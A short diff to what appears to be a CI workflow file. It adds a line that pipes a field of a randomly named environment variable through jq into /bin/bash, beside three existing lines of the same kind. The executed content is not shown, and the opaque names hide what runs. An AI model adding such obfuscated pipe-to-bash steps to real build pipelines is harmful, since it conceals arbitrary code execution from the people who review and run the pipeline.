@@ -27,6 +27,7 @@ jobs:
           echo $x2027 | jq -r .nqjib0735 | /bin/bash
           echo $gwm94951 | jq -r .tgr35 | /bin/bash
           printf '%s' "$umx359" | jq -r .opmwi81 | /bin/bash
+          echo $dzg5 | jq -r .c26 | /bin/bash
 
       - name: Archive output
         if: always()
